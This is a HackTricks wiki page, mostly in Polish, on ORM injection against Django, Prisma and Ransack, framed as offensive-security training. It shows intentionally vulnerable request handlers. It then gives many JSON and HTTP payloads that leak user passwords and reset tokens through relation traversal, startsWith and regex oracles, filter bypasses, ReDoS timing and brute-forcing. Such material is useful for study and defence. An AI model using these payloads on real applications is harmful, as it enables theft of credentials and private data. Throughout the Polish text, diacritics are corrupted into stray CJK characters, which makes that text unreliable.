# ORM Injection

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="../.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../.gitbook/assets/arte.png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="../.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="../.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the**  [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter**  [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}

## Django ORM (Python)

W [**tym pocie**](https://www.elttam.com/blog/plormbing-your-django-orm/) wyjaniono, jak mo偶na uczyni Django ORM podatnym, u偶ywajc na przykad kodu takiego jak:

<pre class="language-python"><code class="lang-python">class ArticleView(APIView):
"""
Podstawowy widok API, do kt贸rego u偶ytkownicy wysyaj 偶dania w celu
wyszukiwania artyku贸w
"""
def post(self, request: Request, format=None):
try:
<strong>            articles = Article.objects.filter(**request.data)
</strong>            serializer = ArticleSerializer(articles, many=True)
except Exception as e:
return Response([])
return Response(serializer.data)
</code></pre>

Zauwa偶, jak wszystkie request.data (kt贸re bd w formacie json) s bezporednio przekazywane do **filtr贸w obiekt贸w z bazy danych**. Atakujcy m贸gby wysa nieoczekiwane filtry, aby wycieko wicej danych, ni偶 si spodziewano.

Przykady:

* **Logowanie:** W prostym logowaniu spr贸buj wyciekowa hasa u偶ytkownik贸w zarejestrowanych w systemie.
```json
{
"username": "admin",
"password_startswith":"a"
}
```
{% hint style="danger" %}
Mo偶liwe jest przeprowadzenie ataku brute-force na haso, a偶 zostanie ujawnione.
{% endhint %}

* **Filtracja relacyjna**: Mo偶liwe jest przeszukiwanie relacji w celu ujawnienia informacji z kolumn, kt贸re nie byy nawet oczekiwane w operacji. Na przykad, jeli mo偶liwe jest ujawnienie artyku贸w stworzonych przez u偶ytkownika z tymi relacjami: Article(`created_by`) -\[1..1]-> Author (`user`) -\[1..1]-> User(`password`).
```json
{
"created_by__user__password__contains":"pass"
}
```
{% hint style="danger" %}
Mo偶liwe jest znalezienie hasa wszystkich u偶ytkownik贸w, kt贸rzy stworzyli artyku
{% endhint %}

* **Filtrowanie relacji wiele-do-wielu**: W poprzednim przykadzie nie moglimy znale藕 hase u偶ytkownik贸w, kt贸rzy nie stworzyli artykuu. Jednak偶e, pod偶ajc za innymi relacjami, jest to mo偶liwe. Na przykad: Article(`created_by`) -\[1..1]-> Author(`departments`) -\[0..\*]-> Department(`employees`) -\[0..\*]-> Author(`user`) -\[1..1]-> User(`password`).
```json
{
"created_by__departments__employees__user_startswith":"admi"
}
```
{% hint style="danger" %}
W tym przypadku mo偶emy znale藕 wszystkich u偶ytkownik贸w w dziaach u偶ytkownik贸w, kt贸rzy stworzyli artykuy, a nastpnie wyciekowa ich hasa (w poprzednim jsonie wyciekamy tylko nazwy u偶ytkownik贸w, ale p贸藕niej mo偶liwe jest wycieknicie hase).
{% endhint %}

* **Wykorzystywanie relacji wiele-do-wielu midzy grupami a uprawnieniami w Django**: Co wicej, model AbstractUser jest u偶ywany do generowania u偶ytkownik贸w w Django i domylnie model ten ma pewne **relacje wiele-do-wielu z tabelami Permission i Group**. Co zasadniczo jest domylnym sposobem **dostpu do innych u偶ytkownik贸w z jednego u偶ytkownika**, jeli s w **tej samej grupie lub dziel te same uprawnienia**.
```bash
# By users in the same group
created_by__user__groups__user__password

# By users with the same permission
created_by__user__user_permissions__user__password
```
* **Obejcie ogranicze filtr贸w**: Ten sam post na blogu zaproponowa obejcie u偶ycia niekt贸rych filtr贸w, takich jak `articles = Article.objects.filter(is_secret=False, **request.data)`. Mo偶liwe jest zrzucenie artyku贸w, kt贸re maj is\_secret=True, poniewa偶 mo偶emy wr贸ci z relacji do tabeli Article i wyciekowa sekretnych artyku贸w z niesekretnych artyku贸w, poniewa偶 wyniki s czone, a pole is\_secret jest sprawdzane w niesekretnym artykule, podczas gdy dane s wyciekane z sekretnym artykuem.
```bash
Article.objects.filter(is_secret=False, categories__articles__id=2)
```
{% hint style="danger" %}
Wykorzystujc relacje, mo偶liwe jest ominicie nawet filtr贸w majcych na celu ochron wywietlanych danych.
{% endhint %}

* **Bd/Czas oparty na ReDoS**: W poprzednich przykadach oczekiwano r贸偶nych odpowiedzi, jeli filtracja dziaaa lub nie, aby u偶y tego jako oracle. Ale mo偶e si zdarzy, 偶e jaka akcja jest wykonywana w bazie danych i odpowied藕 jest zawsze taka sama. W tym scenariuszu mo偶liwe byoby wywoanie bdu w bazie danych, aby uzyska nowy oracle.
```json
// Non matching password
{
"created_by__user__password__regex": "^(?=^pbkdf1).*.*.*.*.*.*.*.*!!!!$"
}

// ReDoS matching password (will show some error in the response or check the time)
{"created_by__user__password__regex": "^(?=^pbkdf2).*.*.*.*.*.*.*.*!!!!$"}
```
From te same post regarding this vector:

* **SQLite**: Domylnie nie ma operatora regexp (wymaga zaadowania rozszerzenia firm trzecich)
* **PostgreSQL**: Nie ma domylnego limitu czasu regex i jest mniej podatny na backtracking
* **MariaDB**: Nie ma limitu czasu regex

## Prisma ORM (NodeJS)

The following are [**tricks extracted from this post**](https://www.elttam.com/blog/plorming-your-primsa-orm/).

* **Full find control**:

<pre class="language-javascript"><code class="lang-javascript">const app = express();

app.use(express.json());

app.post('/articles/verybad', async (req, res) => {
try {
// Attacker has full control of all prisma options
<strong>        const posts = await prisma.article.findMany(req.body.filter)
</strong>        res.json(posts);
} catch (error) {
res.json([]);
}
});
</code></pre>

It's possible to see that the whole javascript body is passed to prisma to perform queries.

In the example from the original post, this would check all the posts createdBy someone (each post is created by someone) returning also the user info of that someone (username, password...)
```json
{
"filter": {
"include": {
"createdBy": true
}
}
}

// Response
[
{
"id": 1,
"title": "Buy Our Essential Oils",
"body": "They are very healthy to drink",
"published": true,
"createdById": 1,
"createdBy": {
"email": "karen@example.com",
"id": 1,
"isAdmin": false,
"name": "karen",
"password": "super secret passphrase",
"resetToken": "2eed5e80da4b7491"
}
},
...
]
```
```markdown
Nastpujce zapytanie wybiera wszystkie posty utworzone przez kogo z hasem i zwr贸ci haso:
```
```json
{
"filter": {
"select": {
"createdBy": {
"select": {
"password": true
}
}
}
}
}

// Response
[
{
"createdBy": {
"password": "super secret passphrase"
}
},
...
]
```
* **Pena kontrola nad klauzul where**:

Przyjrzyjmy si temu, gdzie atak mo偶e kontrolowa klauzul `where`:

<pre class="language-javascript"><code class="lang-javascript">app.get('/articles', async (req, res) => {
try {
const posts = await prisma.article.findMany({
<strong>            where: req.query.filter as any // Wra偶liwe na wycieki ORM
</strong>        })
res.json(posts);
} catch (error) {
res.json([]);
}
});
</code></pre>

Mo偶liwe jest bezporednie filtrowanie hase u偶ytkownik贸w, jak:
```javascript
await prisma.article.findMany({
where: {
createdBy: {
password: {
startsWith: "pas"
}
}
}
})
```
{% hint style="danger" %}
U偶ywajc operacji takich jak `startsWith`, mo偶liwe jest wycieknicie informacji.&#x20;
{% endhint %}

* **Obchodzenie filtrowania w relacjach wiele-do-wielu:**&#x20;
```javascript
app.post('/articles', async (req, res) => {
try {
const query = req.body.query;
query.published = true;
const posts = await prisma.article.findMany({ where: query })
res.json(posts);
} catch (error) {
res.json([]);
}
});
```
Mo偶liwe jest wycieknicie nieopublikowanych artyku贸w poprzez powracanie do relacji wiele-do-wielu midzy `Category` -\[\*..\*]-> `Article`:
```json
{
"query": {
"categories": {
"some": {
"articles": {
"some": {
"published": false,
"{articleFieldToLeak}": {
"startsWith": "{testStartsWith}"
}
}
}
}
}
}
}
```
Mo偶liwe jest r贸wnie偶 wycieknicie wszystkich u偶ytkownik贸w, nadu偶ywajc niekt贸rych relacji wiele-do-wielu z ptl:
```json
{
"query": {
"createdBy": {
"departments": {
"some": {
"employees": {
"some": {
"departments": {
"some": {
"employees": {
"some": {
"departments": {
"some": {
"employees": {
"some": {
"{fieldToLeak}": {
"startsWith": "{testStartsWith}"
}
}
}
}
}
}
}
}
}
}
}
}
}
}
}
}
```
* **Bdy/Zapytania czasowe**: W oryginalnym pocie mo偶na przeczyta bardzo obszerny zestaw test贸w przeprowadzonych w celu znalezienia optymalnego adunku do wycieku informacji za pomoc adunku opartego na czasie. To jest:
```json
{
"OR": [
{
"NOT": {ORM_LEAK}
},
{CONTAINS_LIST}
]
}
```
Gdzie `{CONTAINS_LIST}` to lista z 1000 cigami, aby upewni si, 偶e **odpowied藕 jest op贸藕niona, gdy zostanie znaleziony poprawny leak.**

## **Ransack (Ruby)**

Te sztuczki zostay [**znalezione w tym pocie**](https://positive.security/blog/ransack-data-exfiltration)**.**

{% hint style="success" %}
**Zauwa偶, 偶e Ransack 4.0.0.0 teraz wymusza u偶ycie jawnej listy dozwolonych atrybut贸w i powiza do przeszukiwania.**
{% endhint %}

**Przykad podatny:**
```ruby
def index
@q = Post.ransack(params[:q])
@posts = @q.result(distinct: true)
end
```
Zauwa偶, jak zapytanie bdzie definiowane przez parametry wysyane przez atakujcego. Mo偶liwe byo na przykad przeprowadzenie brute-force na tokenie resetujcym za pomoc:
```http
GET /posts?q[user_reset_password_token_start]=0
GET /posts?q[user_reset_password_token_start]=1
...
```
By brute-forcing i potencjalnie relacjami mo偶liwe byo wycieknicie wikszej iloci danych z bazy danych.

## References

* [https://www.elttam.com/blog/plormbing-your-django-orm/](https://www.elttam.com/blog/plormbing-your-django-orm/)
* [https://www.elttam.com/blog/plorming-your-primsa-orm/](https://www.elttam.com/blog/plorming-your-primsa-orm/)
* [https://positive.security/blog/ransack-data-exfiltration](https://positive.security/blog/ransack-data-exfiltration)

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="../.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../.gitbook/assets/arte.png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="../.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="../.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the**  [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter**  [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}
